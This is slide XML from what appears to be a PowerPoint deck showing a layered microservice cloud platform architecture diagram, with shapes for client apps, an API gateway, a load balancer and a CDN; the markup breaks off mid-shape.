          <a:solidFill>
            <a:srgbClr val="0A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57876" y="0"/>
            <a:ext cx="8991" cy="6858000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0A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77168" y="0"/>
            <a:ext cx="8991" cy="6858000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0A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96460" y="0"/>
            <a:ext cx="8991" cy="6858000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0A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15752" y="0"/>
            <a:ext cx="8991" cy="6858000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0A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35044" y="0"/>
            <a:ext cx="8991" cy="6858000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0A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54336" y="0"/>
            <a:ext cx="8991" cy="6858000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0A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73628" y="0"/>
            <a:ext cx="8991" cy="6858000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0A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92920" y="0"/>
            <a:ext cx="8991" cy="6858000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0A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12212" y="0"/>
            <a:ext cx="8991" cy="6858000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0A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31504" y="0"/>
            <a:ext cx="8991" cy="6858000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0A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8991"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0A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719292"/>
            <a:ext cx="9144000" cy="8991"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0A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438584"/>
            <a:ext cx="9144000" cy="8991"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0A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157876"/>
            <a:ext cx="9144000" cy="8991"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0A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877168"/>
            <a:ext cx="9144000" cy="8991"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0A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596460"/>
            <a:ext cx="9144000" cy="8991"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0A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315752"/>
            <a:ext cx="9144000" cy="8991"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0A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035044"/>
            <a:ext cx="9144000" cy="8991"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0A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754336"/>
            <a:ext cx="9144000" cy="8991"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0A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473628"/>
            <a:ext cx="9144000" cy="8991"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0A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858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7717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1575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5434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9292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3150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7009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50867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94726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38584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582442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726301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70159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14018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57876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301735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445593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89451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33310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877168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021027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64885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08743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452602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596460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740319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884177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028035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171894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315752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459611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603469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47327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91186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035044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178903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22761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466619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610478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754336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98195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042053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185912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329770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473628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617487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761345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905204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049062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192920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336779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480637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624496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768354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912212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056071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199929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343788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487646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631504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775363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919221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063080" y="0"/>
            <a:ext cx="4496" cy="6858000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="051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0" y="192186"/>
            <a:ext cx="9144000" cy="647363"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0814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0" y="830558"/>
            <a:ext cx="9144000" cy="8991"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0078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0" y="821566"/>
            <a:ext cx="9144000" cy="17982"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00B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0" y="192186"/>
            <a:ext cx="143858" cy="17982"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0078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0" y="192186"/>
            <a:ext cx="17982" cy="143858"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0078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43858" y="318062"/>
            <a:ext cx="395611" cy="395611"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="001830"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="0078C8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43858" y="318062"/>
            <a:ext cx="395611" cy="3956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🏗️</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="97" name="Text 95"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="593416" y="300080"/>
            <a:ext cx="4495575" cy="233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0F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微服务平台系统架构设计图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593416" y="551832"/>
            <a:ext cx="4495575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38" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="4A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Cloud Platform · v3.2 · C4 Model Context Diagram</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="638" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="99" name="Text 97"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6563540" y="300080"/>
            <a:ext cx="2499540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3A6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DOC-ARCH-2026-031 · CONFIDENTIAL</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="100" name="Text 98"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6563540" y="443938"/>
            <a:ext cx="2499540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7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3.2.1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6563540" y="623761"/>
            <a:ext cx="2499540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563" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="3A6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Arch: 赵建国 · Review: 技术委员会</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="563" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="102" name="Shape 100"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="143858" y="875513"/>
            <a:ext cx="7192920" cy="143858"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="002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43858" y="1010381"/>
            <a:ext cx="7192920" cy="8991"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="004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42973" y="947442"/>
            <a:ext cx="8991" cy="62938"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="004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99115" y="875513"/>
            <a:ext cx="287717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488" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="106" name="Shape 104"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1942088" y="947442"/>
            <a:ext cx="8991" cy="62938"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="004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798230" y="875513"/>
            <a:ext cx="287717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488" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="108" name="Shape 106"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2841204" y="947442"/>
            <a:ext cx="8991" cy="62938"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="004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697345" y="875513"/>
            <a:ext cx="287717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</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="488" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="110" name="Shape 108"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3740319" y="947442"/>
            <a:ext cx="8991" cy="62938"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="004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596460" y="875513"/>
            <a:ext cx="287717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endParaRPr lang="en-US" sz="488" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="112" name="Shape 110"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4639434" y="947442"/>
            <a:ext cx="8991" cy="62938"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="004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495575" y="875513"/>
            <a:ext cx="287717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endParaRPr lang="en-US" sz="488" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="114" name="Shape 112"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5538549" y="947442"/>
            <a:ext cx="8991" cy="62938"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="004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394690" y="875513"/>
            <a:ext cx="287717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600</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="488" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="116" name="Shape 114"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6437664" y="947442"/>
            <a:ext cx="8991" cy="62938"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="004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293805" y="875513"/>
            <a:ext cx="287717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700</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="488" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="118" name="Shape 116"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="143858" y="1019372"/>
            <a:ext cx="7192920" cy="4927150"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="060E18"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="00489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43858" y="1028363"/>
            <a:ext cx="7192920" cy="611398"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0014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43858" y="1630770"/>
            <a:ext cx="7192920" cy="8991"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="004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79823" y="1046345"/>
            <a:ext cx="3596460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525" kern="0" spc="200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2A5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CLIENT LAYER</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="122" name="Shape 120"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="143858" y="1639761"/>
            <a:ext cx="7192920" cy="575434"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0010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43858" y="2206204"/>
            <a:ext cx="7192920" cy="8991"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="004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79823" y="1657743"/>
            <a:ext cx="3596460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525" kern="0" spc="200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2A5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GATEWAY LAYER</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="125" name="Shape 123"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="143858" y="2215195"/>
            <a:ext cx="7192920" cy="1060956"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="000C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43858" y="3267159"/>
            <a:ext cx="7192920" cy="8991"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="004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79823" y="2233177"/>
            <a:ext cx="3596460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525" kern="0" spc="200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2A5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MICROSERVICE LAYER</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="128" name="Shape 126"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="143858" y="3276150"/>
            <a:ext cx="7192920" cy="647363"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0010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43858" y="3914522"/>
            <a:ext cx="7192920" cy="8991"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="004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79823" y="3294133"/>
            <a:ext cx="3596460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525" kern="0" spc="200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2A5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L4 · MESSAGING &amp; CACHE</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="131" name="Shape 129"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="143858" y="3923513"/>
            <a:ext cx="7192920" cy="989027"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="000C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43858" y="4903549"/>
            <a:ext cx="7192920" cy="8991"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="004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79823" y="3941496"/>
            <a:ext cx="3596460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525" kern="0" spc="200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2A5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L5 · DATA PERSISTENCE LAYER</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="134" name="Shape 132"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="143858" y="4912540"/>
            <a:ext cx="7192920" cy="683327"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0008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43858" y="5586876"/>
            <a:ext cx="7192920" cy="8991"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="004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79823" y="4930522"/>
            <a:ext cx="3596460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525" kern="0" spc="200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2A5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L6 · INFRASTRUCTURE &amp; OBSERVABILITY</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="137" name="Shape 135"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="143858" y="5586876"/>
            <a:ext cx="7192920" cy="359646"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0008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69735" y="1091301"/>
            <a:ext cx="791221" cy="431575"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="003278"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="00489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269735" y="1127265"/>
            <a:ext cx="791221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750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="140" name="Text 138"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="287717" y="1289106"/>
            <a:ext cx="755257" cy="116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App</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="141" name="Text 139"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="287717" y="1405991"/>
            <a:ext cx="755257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6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18</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="488" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="142" name="Shape 140"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1168850" y="1091301"/>
            <a:ext cx="791221" cy="431575"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="003278"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="00489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1168850" y="1127265"/>
            <a:ext cx="791221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750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="144" name="Text 142"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1186832" y="1289106"/>
            <a:ext cx="755257" cy="116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Mobile App</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="145" name="Text 143"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1186832" y="1405991"/>
            <a:ext cx="755257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6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</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="488" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="146" name="Shape 144"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2067965" y="1091301"/>
            <a:ext cx="791221" cy="431575"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="003278"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="00489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2067965" y="1127265"/>
            <a:ext cx="791221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🖥️</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="148" name="Text 146"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2085947" y="1289106"/>
            <a:ext cx="755257" cy="116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Desktop</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="149" name="Text 147"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2085947" y="1405991"/>
            <a:ext cx="755257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6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Electron</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="488" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="150" name="Shape 148"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2967080" y="1091301"/>
            <a:ext cx="791221" cy="431575"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="003278"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="004890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2967080" y="1127265"/>
            <a:ext cx="791221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750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="152" name="Text 150"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2985062" y="1289106"/>
            <a:ext cx="755257" cy="116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OpenAPI</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="153" name="Text 151"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2985062" y="1405991"/>
            <a:ext cx="755257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6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 / gRPC</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="488" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="154" name="Shape 152"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="899115" y="1720681"/>
            <a:ext cx="1168850" cy="395611"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0050A0"/>
          </a:solidFill>
          <a:ln w="19050">
            <a:solidFill>
              <a:srgbClr val="00B4FF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899115" y="1738664"/>
            <a:ext cx="1168850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75" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E0F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🛡️ API Gateway</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="675" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="156" name="Text 154"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="899115" y="1882522"/>
            <a:ext cx="1168850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5" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="3A9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Kong · Rate Limit · Auth</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="157" name="Text 155"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="899115" y="1990416"/>
            <a:ext cx="1168850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6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8000 req/s · SSL Termination</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="488" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="158" name="Shape 156"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2247788" y="1720681"/>
            <a:ext cx="899115" cy="395611"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="002040"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="00489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2247788" y="1756646"/>
            <a:ext cx="899115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⚖️</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="160" name="Text 158"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2265770" y="1900504"/>
            <a:ext cx="863150" cy="116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Load Balancer</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="161" name="Text 159"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2265770" y="2017389"/>
            <a:ext cx="863150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6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</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="488" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="162" name="Shape 160"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3308743" y="1720681"/>
            <a:ext cx="791221" cy="395611"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="002040"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="004890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3308743" y="1756646"/>
            <a:ext cx="791221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☁️</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="164" name="Text 162"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3326726" y="1900504"/>
            <a:ext cx="755257" cy="116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CDN</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="165" name="Text 163"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3326726" y="2017389"/>
            <a:ext cx="755257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6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CloudFlare</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="488" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="166" name="Shape 164"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="251752" y="2260150"/>
            <a:ext cx="755257" cy="449558"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="001828"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="004890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251752" y="2296115"/>
            <a:ext cx="755257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750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="168" name="Text 166"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
